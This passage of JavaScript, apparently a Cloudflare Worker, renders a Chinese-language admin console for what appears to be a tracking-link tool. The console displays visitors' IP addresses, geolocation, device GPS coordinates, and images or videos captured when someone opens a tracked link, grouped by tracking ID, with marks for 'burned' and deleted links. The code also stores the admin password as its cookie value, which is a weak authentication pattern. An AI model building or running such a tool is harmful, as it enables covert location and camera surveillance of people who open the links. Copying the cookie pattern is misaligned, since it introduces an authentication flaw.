    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
  </head>
  <body class="bg-gray-100 flex items-center justify-center min-h-screen">
    <div class="bg-white p-8 rounded-2xl shadow-lg max-w-md w-full">
      <div class="text-center mb-8">
        <div class="w-16 h-16 bg-indigo-100 text-indigo-600 rounded-full flex items-center justify-center mx-auto mb-4 text-2xl">
          <i class="fa-solid fa-server"></i>
        </div>
        <h1 class="text-2xl font-bold text-gray-800">系统控制台</h1>
        <p class="text-gray-500 text-sm mt-2">请输入管理员密码以继续</p>
      </div>
      ${errorHtml}
      <form method="POST" action="/admin" class="space-y-6">
        <div>
          <input type="password" name="password" required placeholder="请输入密码" class="w-full px-4 py-3 rounded-xl bg-gray-50 border border-gray-200 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 outline-none transition-all">
        </div>
        <button type="submit" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-3 rounded-xl shadow-lg shadow-indigo-200 transition-all active:scale-95">
          进入后台
        </button>
      </form>
    </div>
  </body>
  </html>`;
  return new Response(html, { headers: { "Content-Type": "text/html" } });
}

async function renderAdmin(request, env) {
  if (request.method === "POST") {
    const formData = await request.formData();
    const pwd = formData.get("password");
    if (pwd === ADMIN_PASSWORD) {
      return new Response("Redirecting...", {
        status: 302,
        headers: {
          "Location": "/admin",
          "Set-Cookie": `admin_auth=${ADMIN_PASSWORD}; Path=/; HttpOnly; Max-Age=86400`
        }
      });
    } else {
      return renderAdminLogin("密码错误，请重试");
    }
  }

  const cookie = request.headers.get("Cookie") || "";
  if (!cookie.includes(`admin_auth=${ADMIN_PASSWORD}`)) {
    return renderAdminLogin();
  }

  const { results } = await env.DB.prepare("SELECT * FROM sys_logs ORDER BY created_at DESC LIMIT 500").all();

  // 按 target_id 分组
  const groups = new Map();
  for (const r of results) {
    if (!groups.has(r.target_id)) groups.set(r.target_id, []);
    groups.get(r.target_id).push(r);
  }

  let sectionsHtml = "";
  for (const [targetId, logs] of groups) {
    // 组标题
    sectionsHtml += `<div class="mb-6 bg-white rounded-2xl shadow-sm border border-gray-200 overflow-hidden">
      <div class="p-4 bg-indigo-50 border-b border-indigo-100 flex items-center justify-between">
        <h2 class="text-lg font-bold text-indigo-900"><i class="fa-solid fa-fingerprint mr-2"></i>跟踪 ID：${escapeHtml(targetId)} <span class="text-sm text-gray-500 ml-2">(${logs.length} 条记录)</span></h2>
      </div>
      <div class="overflow-x-auto">
        <table class="w-full text-left border-collapse">
          <thead class="bg-gray-50 border-b">
            <tr>
              <th class="p-4 text-sm font-semibold text-gray-600">事件 / 时间</th>
              <th class="p-4 text-sm font-semibold text-gray-600">IP / 定位</th>
              <th class="p-4 text-sm font-semibold text-gray-600">GPS</th>
              <th class="p-4 text-sm font-semibold text-gray-600">媒体</th>
              <th class="p-4 text-sm font-semibold text-gray-600">操作</th>
            </tr>
          </thead>
          <tbody class="divide-y divide-gray-100">`;

    for (const r of logs) {
      let eventColor = r.event_type === 'GENERATE' ? 'bg-blue-100 text-blue-700' : (r.event_type === 'QUERY' ? 'bg-emerald-100 text-emerald-700' : (r.event_type === 'DELETE' ? 'bg-red-100 text-red-700' : 'bg-purple-100 text-purple-700'));
      let eventIcon = r.event_type === 'GENERATE' ? 'fa-wand-magic' : (r.event_type === 'QUERY' ? 'fa-search' : (r.event_type === 'DELETE' ? 'fa-trash' : 'fa-crosshairs'));

      let ipInfo = {};
      try { if (r.geo_info) ipInfo = JSON.parse(r.geo_info); } catch(e) {}
      let geoStr = 'Geo Info Error';
      if (ipInfo.ip) {
        geoStr = (ipInfo.flag || '') + ' ' + (ipInfo.countryRegion || '') + ' ' + (ipInfo.city || '') + ' - ' + (ipInfo.asOrganization || '');
      }

      let mediaBlock = '<span class="text-gray-400 text-xs">-</span>';
      if (r.event_type === 'VISIT') {
        if (r.status === 'denied') {
          mediaBlock = '<span class="px-2 py-1 bg-red-100 text-red-600 rounded text-xs font-bold">拒绝权限</span>';
        } else if (r.media_url) {
          if (r.media_type === 'video') {
            mediaBlock = `<button onclick="openMedia('video', '${escapeJs(r.media_url)}')" class="text-indigo-500 hover:underline text-xs"><i class="fa-solid fa-play-circle mr-1"></i>播放</button>`;
          } else {
            mediaBlock = `<button onclick="openMedia('image', '${escapeJs(r.media_url)}')" class="text-indigo-500 hover:underline"><img src="${escapeHtml(r.media_url)}" class="h-12 w-auto rounded hover:scale-150 transition-transform origin-left object-cover"></button>`;
          }
        }
      }

      let deviceGeoBlock = '<span class="text-gray-400 text-xs">-</span>';
      if (r.device_geo) {
         try {
             const dGeo = JSON.parse(r.device_geo);
             if (dGeo.denied) {
                 deviceGeoBlock = '<span class="text-red-500 text-xs">拒绝定位</span>';
             } else {
                 deviceGeoBlock = '<div class="text-xs text-emerald-600 font-mono">' + dGeo.lat + ', ' + dGeo.lng + '</div>';
             }
         } catch(e) {}
      }

      const burnedBadge = r.is_burned ? '<span class="ml-1 px-2 py-1 rounded text-[10px] font-bold bg-orange-100 text-orange-600">已焚毁</span>' : '';
      const deletedBadge = r.is_deleted ? '<span class="ml-1 px-2 py-1 rounded text-[10px] font-bold bg-red-100 text-red-600">已删除</span>' : '';
      const dateStr = new Date(r.created_at + 'Z').toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });

      sectionsHtml += `<tr class="hover:bg-gray-50">
        <td class="p-4">
          <div class="flex items-center space-x-2 mb-1">
            <span class="px-2 py-1 rounded text-[10px] font-bold ${eventColor}"><i class="fa-solid ${eventIcon} mr-1"></i>${r.event_type}</span>
            ${burnedBadge}${deletedBadge}
          </div>
          <div class="text-xs text-gray-500">${dateStr}</div>
        </td>
        <td class="p-4">
          <div class="text-sm font-mono text-gray-800">${escapeHtml(r.ip)}</div>
          <div class="text-xs text-gray-500 truncate max-w-xs" title="${escapeHtml(geoStr)}">${escapeHtml(geoStr)}</div>
        </td>
        <td class="p-4">${deviceGeoBlock}</td>
        <td class="p-4">${mediaBlock}</td>
        <td class="p-4">
          <button onclick="deleteLog(${r.id})" class="text-red-500 hover:text-red-700 text-xs"><i class="fa-solid fa-trash-can"></i></button>
        </td>
      </tr>`;
    }
    sectionsHtml += `</tbody></table></div></div>`;
  }

  const html = `
  <!DOCTYPE html>
  <html lang="zh">
  <head>
    <meta charset="UTF-8">
    <title>SEC-TEST 超级控制台</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
      .modal { display: none; position: fixed; inset:0; background: rgba(0,0,0,0.7); z-index:50; align-items:center; justify-content:center; }
      .modal.active { display:flex; }
    </style>
  </head>
  <body class="bg-gray-100 p-6 font-sans">
    <div class="max-w-7xl mx-auto">
      <div class="flex justify-between items-center mb-6 bg-white p-6 rounded-2xl shadow-sm border border-gray-200">
        <h1 class="text-2xl font-bold text-gray-800"><i class="fa-solid fa-server text-indigo-600 mr-2"></i>全局事件审计日志</h1>
        <div class="flex items-center space-x-4">
          <span class="text-sm text-gray-500">最近 500 条记录（按ID时间轴分组）</span>
          <button onclick="clearAll()" class="px-4 py-2 bg-red-600 text-white text-sm rounded-xl hover:bg-red-700 shadow">清空所有数据</button>
        </div>
      </div>
      ${sectionsHtml}
    </div>

    <!-- 媒体预览模态框 -->
    <div id="mediaModal" class="modal" onclick="this.classList.remove('active')">
      <div class="bg-white rounded-2xl p-4 max-w-3xl max-h-[90vh] overflow-auto shadow-2xl" onclick="event.stopPropagation()">
        <div id="mediaContent" class="flex items-center justify-center"></div>
      </div>
    </div>

    <script>
      async function deleteLog(id) {
        if (!confirm('确定删除该条记录？')) return;
        const res = await fetch('/admin/delete', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ id })
        });
        if (res.ok) location.reload();
        else alert('删除失败');
      }
      async function clearAll() {
        if (!confirm('此操作将清空所有日志和追踪配置，不可恢复！确定继续？')) return;
        const res = await fetch('/admin/clear', { method: 'POST' });
        if (res.ok) location.reload();
        else alert('清空失败');
      }
      function openMedia(type, url) {
        const modal = document.getElementById('mediaModal');
        const content = document.getElementById('mediaContent');
        if (type === 'video') {
          content.innerHTML = '<video src="' + url + '" controls autoplay class="max-w-full max-h-[80vh] rounded-xl"></video>';
        } else {
          content.innerHTML = '<img src="' + url + '" class="max-w-full max-h-[80vh] rounded-xl">';
        }
        modal.classList.add('active');
      }
    </script>
  </body>
  </html>`;

  return new Response(html, { headers: { "Content-Type": "text/html" } });
}

// 辅助转义函数
function escapeHtml(text) {
  return text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}
function escapeJs(str) {
  return str.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '\\"');
}